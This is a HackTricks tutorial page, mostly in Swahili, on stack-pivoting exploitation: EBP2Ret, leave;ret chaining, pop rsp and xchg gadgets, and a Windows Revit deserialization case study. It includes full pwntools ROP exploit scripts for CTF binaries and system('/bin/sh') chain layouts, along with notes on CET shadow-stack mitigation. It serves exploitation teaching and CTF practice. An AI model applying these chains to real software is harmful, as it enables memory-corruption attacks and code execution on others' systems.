# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Mbinu hii inatumia uwezo wa kudhibiti **Base Pointer (EBP/RBP)** kuunganisha utekelezaji wa funsi nyingi kupitia matumizi makini ya kiashiria cha fremu na mfululizo wa maagizo **`leave; ret`**.

Kumbuka, kwenye x86/x86-64 **`leave`** ni sawa na:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
And as the saved **EBP/RBP is in the stack** before the saved EIP/RIP, it's possible to control it by controlling the stack.

> Notes
> - On 64-bit, replace EBP→RBP and ESP→RSP. Semantics are the same.
> - Some compilers omit the frame pointer (see “EBP might not be used”). In that case, `leave` might not appear and this technique won’t work.

### EBP2Ret

Tekniki hii ni ya muhimu hasa unapoweza **kubadilisha saved EBP/RBP lakini hauwezi kubadilisha EIP/RIP moja kwa moja**. Inatumia tabia ya function epilogue.

Ikiwa, wakati wa utekelezaji wa `fvuln`, utaweza kuingiza **EBP bandia** kwenye stack inayorejelea eneo la kumbukumbu ambapo anuani ya shellcode/ROP chain yako iko (plus 8 bytes on amd64 / 4 bytes on x86 kwa kuzingatia `pop`), unaweza kwa njia isiyo ya moja kwa moja kudhibiti RIP. Wakati function inarudi, `leave` itabeba RSP kwenye eneo uliotengenezwa na `pop rbp` inayofuata itapunguza RSP, **kwa ufanisi ikifanya ionekane kama inaonyesha anuani iliyowekwa na attacker hapo**. Kisha `ret` itatumia anuani hiyo.

Kumbuka kwamba unahitaji kujua anuani 2: anuani ambapo ESP/RSP itaenda, na thamani iliyohifadhiwa kwenye anuani hiyo ambayo `ret` itatumia.

#### Exploit Construction

Kwanza unahitaji kujua anuani ambapo unaweza kuandika data/anuani kwa uhuru. RSP itaonyesha hapa na **itakula `ret` ya kwanza**.

Kisha, unahitaji kuchagua anuani itakayotumiwa na `ret` ambayo itaweza **kuhamisha utekelezaji**. Unaweza kutumia:

- A valid [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.
- The address of **`system()`** followed by the appropriate return and arguments (on x86: `ret` target = `&system`, then 4 junk bytes, then `&"/bin/sh"`).
- The address of a **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) followed by inline shellcode.
- A [**ROP**](../rop-return-oriented-programing/index.html) chain staged in writable memory.

Kumbuka kwamba kabla ya anuani yoyote ya hizi katika eneo lenye udhibiti, lazima kuwe na **nafasi kwa `pop ebp/rbp`** kutoka `leave` (8B on amd64, 4B on x86). Unaweza kutumia bytes hizi kuweka **EBP bandia ya pili** na kuendelea kudhibiti baada ya call ya kwanza kurudi.

#### Off-By-One Exploit

Kuna aina inayotumika unapoweza **kubadilisha tu byte ya chini kabisa ya saved EBP/RBP**. Katika hali kama hiyo, eneo la kumbukumbu linalohifadhi anuani ya kuruka nayo kwa **`ret`** lazima lishiriki bytes tatu/tano za kwanza na EBP/RBP ya awali ili overwrite ya 1-byte iweze kuielekeza. Kawaida byte ya chini (offset 0x00) huongezeka ili kuruka kadri inavyowezekana ndani ya ukurasa uliokaribu/aliowekwa.

Ni kawaida pia kutumia RET sled kwenye stack na kuweka ROP chain halisi mwishoni ili kuongeza uwezekano kuwa RSP mpya itaonyesha ndani ya sled na ROP chain ya mwisho itatekelezwa.

### EBP Chaining

Kwa kuweka anuani inayodhibitiwa kwenye slot ya saved `EBP` ya stack na gadget ya `leave; ret` katika `EIP/RIP`, inawezekana **kuhamisha `ESP/RSP` kwenda anuani inayodhibitiwa na attacker**.

Sasa `RSP` iko chini ya udhibiti na instruction inayofuata ni `ret`. Weka katika kumbukumbu inayodhibitiwa kitu kama:

- `&(next fake EBP)` -> Loaded by `pop ebp/rbp` from `leave`.
- `&system()` -> Called by `ret`.
- `&(leave;ret)` -> After `system` ends, moves RSP to the next fake EBP and continues.
- `&("/bin/sh")` -> Argument for `system`.

Kwa njia hii inawezekana kuchain baadhi ya fake EBPs kudhibiti mtiririko wa programu.

Hii ni kama ret2lib, lakini ngumu zaidi na inafaa tu katika edge-cases.

Zaidi ya hayo, hapa kuna [**mfano wa challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) inayotumia tekniki hii na **stack leak** ili kuita function ya kushinda. Hii ni payload ya mwisho kutoka kwenye ukurasa:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> amd64 alignment tip: System V ABI inahitaji alignment ya stack ya 16-byte kwenye call sites. Ikiwa chain yako inaita functions kama `system`, ungeze alignment gadget (mfano, `ret`, au `sub rsp, 8 ; ret`) kabla ya wito ili kudumisha alignment na kuepuka crashes za `movaps`.

## EBP might not be used

Kama [**iliobainishwa katika chapisho hiki**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), ikiwa binary imecompiled na baadhi ya optimizations au kwa frame-pointer omission, **EBP/RBP kamwe haitadhibiti ESP/RSP**. Kwa hivyo, exploit yoyote inayotegemea kudhibiti EBP/RBP itashindwa kwa sababu prologue/epilogue haitafufua kutoka kwa frame pointer.

- Haijaboreshwa / frame pointer inatumika:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- Imeboreshwa / frame pointer omitted:
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
Kwenye amd64 mara nyingi utaona `pop rbp ; ret` badala ya `leave ; ret`, lakini ikiwa frame pointer imeachwa kabisa basi hakuna `rbp`-based epilogue ya kupivot kupitia.

## Njia nyingine za kudhibiti RSP

### `pop rsp` gadget

[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) utaweza kupata mfano unaotumia mbinu hii. Kwa changamoto hiyo ilikuwa inahitajika kuita function yenye arguments 2 maalum, na kulikuwa na **`pop rsp` gadget** na kuna **leak from the stack**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Angalia ret2esp technique hapa:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### Kupata pivot gadgets haraka

Tumia gadget finder unayopendelea kutafuta classic pivot primitives:

- `leave ; ret` on functions or in libraries
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (or `add esp, <imm> ; ret` on x86)

Mifano:
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### Classic pivot staging pattern

Mbinu thabiti ya pivot inayotumika katika CTFs/exploits:

1) Tumia overflow ndogo ya awali ili kuita `read`/`recv` katika eneo kubwa la kuandika (e.g., `.bss`, heap, au mapped RW memory) na weka full ROP chain huko.
2) Rudi ndani ya pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) ili kuhamisha RSP hadi eneo hilo.
3) Endelea na staged chain (e.g., leak libc, call `mprotect`, kisha `read` shellcode, halafu ruka kwenye hiyo).

### Windows: Destructor-loop weird-machine pivots (Revit RFA case study)

Parsers za client-side wakati mwingine hufanya destructor loops zinazoweza kuita kwa njia isiyo ya moja kwa moja function pointer inayotokana na attacker-controlled object fields. Ikiwa kila iteresheni inatoa hasa simu isiyo ya moja kwa moja moja (a “one-gadget” machine), unaweza kuibadilisha kuwa reliable stack pivot na ROP entry.

Imeonekana katika Autodesk Revit RFA deserialization (CVE-2025-5037):

- Object zilizotengenezwa za aina `AString` zinaweka pointer kwa attacker bytes kwenye offset 0.
- The destructor loop kwa ufanisi inatekeleza gadget moja kwa kila object:
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Pivots mbili za vitendo:

- Windows 10 (32-bit heap addrs): gadget isiyo sawa kwa mipangilio (“monster gadget”) inayojumuisha `8B E0` → `mov esp, eax`, hatimaye `ret`, ili ku-pivot kutoka kwa call primitive hadi ROP chain inayotegemea heap.
- Windows 11 (full 64-bit addrs): tumia vitu viwili kuendesha pivot ya weird-machine iliyozuiliwa:
- Gadget 1: `push rax ; pop rbp ; ret` (hamisha rax wa asili ndani ya rbp)
- Gadget 2: `leave ; ... ; ret` (inakuwa `mov rsp, rbp ; pop rbp ; ret`), ikipivot ndani ya buffer ya object ya kwanza, ambapo ROP chain ya kawaida inafuata.

Vidokezo kwa Windows x64 baada ya pivot:

- Heshimu 0x20-byte shadow space na udumishie mlinganiko wa 16-byte kabla ya `call` sites. Mara nyingi ni rahisi kuweka literals juu ya return address na kutumia gadget kama `lea rcx, [rsp+0x20] ; call rax` ikifuatiwa na `pop rax ; ret` ili kupitisha stack addresses bila kuharibu control flow.
- Non-ASLR helper modules (ikiwa zipo) zinatoa stable gadget pools na imports kama `LoadLibraryW`/`GetProcAddress` ili kutatua kwa nguvu targets kama `ucrtbase!system`.
- Kuunda gadgets zilizokosekana kupitia writable thunk: ikiwa mfululizo unaahidi unaishia kwa `call` kupitia writable function pointer (mfano, DLL import thunk au function pointer katika .data), funika pointer hiyo kwa kitu kisicho hatari cha hatua moja kama `pop rax ; ret`. Mfululizo basi utaonekana kama ulimalizika na `ret` (mfano, `mov rdx, rsi ; mov rcx, rdi ; ret`), ambayo ni muhimu sana ili kupakia Windows x64 arg registers bila kuharibu mengine.

Kwa ujenzi kamili wa chain na mifano ya gadget, angalia marejeo hapa chini.

## Mbinu za kisasa za kuzuia stack pivoting (CET/Shadow Stack)

CPU za kisasa za x86 na OS zinatumia kwa wingi **CET Shadow Stack (SHSTK)**. Ikiwa SHSTK imewezeshwa, `ret` inaleta kulinganisha anwani ya kurudi kwenye stack ya kawaida na shadow stack iliyo na ulinzi wa hardware; tofauti yoyote inasababisha Control-Protection fault na kuua mchakato. Kwa hivyo, mbinu kama EBP2Ret/leave;ret-based pivots zitaharibika mara tu `ret` ya kwanza itakapotekelezwa kutoka stack iliyopivotwa.

- Kwa historia na maelezo ya kina angalia:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Ukaguzi wa haraka kwenye Linux:
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- Notes for labs/CTF:
- Baadhi ya distros za kisasa zinawezesha SHSTK kwa binaries zenye CET wakati vifaa na glibc vinavyounga mkono vipo. Kwa upimaji ulio kudhibitiwa katika VMs, SHSTK inaweza kuzimwa kwa mfumo mzima kupitia kernel boot parameter `nousershstk`, au iwezeshwe kwa chaguo kupitia glibc tunables wakati wa startup (ona references). Usizime mitigations kwenye malengo ya uzalishaji.
- Mbinu za JOP/COOP au za SROP zinaweza bado kuwa za kazi kwa baadhi ya malengo, lakini SHSTK kwa namna maalum huvunja pivots zinazotegemea `ret`.

- Windows note: Windows 10+ inaonyesha user-mode na Windows 11 inaongeza kernel-mode “Hardware-enforced Stack Protection” iliyo jengwa kwa shadow stacks. Mchakato unaoungwa mkono na CET unazuia stack pivoting/ROP kwa `ret`; watengenezaji wanajiunga kwa kupitia CETCOMPAT na sera zinazohusiana (ona reference).

## ARM64

Katika ARM64, the **prologue and epilogues** za functions **hazihifadhi wala kurejesha register ya SP** kwenye stack. Zaidi ya hayo, maagizo ya **`RET`** hayarudishi kwa anwani inayotajwa na SP, bali **kwenye anwani ndani ya `x30`**.

Kwa hivyo, kwa chaguo-msingi, kwa kutumia epilogue peke yake **hautakuwa na uwezo wa kudhibiti register ya SP** kwa kuandika juu baadhi ya data ndani ya stack. Na hata ukifanikiwa kudhibiti SP bado utahitaji njia ya **kudhibiti `x30`** register.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> Njia ya kufanya kitu kinachofanana na stack pivoting katika ARM64 itakuwa kuwa na uwezo wa **kudhibiti `SP`** (kwa kudhibiti register fulani ambayo thamani yake hupewa kwa `SP` au kwa sababu kwa namna fulani `SP` inachukua anwani yake kutoka kwenye stack na tuna overflow) kisha **kutumia vibaya epilogue** ili kupakia register ya **`x30`** kutoka kwa **`SP` iliyodhibitiwa** na **`RET`** kwenye hiyo anwani.

Pia kwenye ukurasa ufuatao unaweza kuona sawa na **Ret2esp in ARM64**:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## References

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 bits, off by one exploitation with a rop chain starting with a ret sled
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 bit, hakuna relro, canary, nx na pie. Programu inatoa leak kwa stack au pie na WWW ya qword. Kwanza pata stack leak na tumia WWW kurudi na kupata pie leak. Kisha tumia WWW kuunda mzunguko wa milele ukitumia entries za `.fini_array` + kuitisha `__libc_csu_fini` ([maelezo zaidi hapa](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). Kwa kutumia kuandika “milele” hii, imeandikwa ROP chain katika .bss na mwishowe kuitisha ikipivota kwa RBP.
- Linux kernel documentation: Control-flow Enforcement Technology (CET) Shadow Stack — maelezo kuhusu SHSTK, `nousershstk`, `/proc/$PID/status` flags, na uanzishaji kupitia `arch_prctl`. https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn: Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
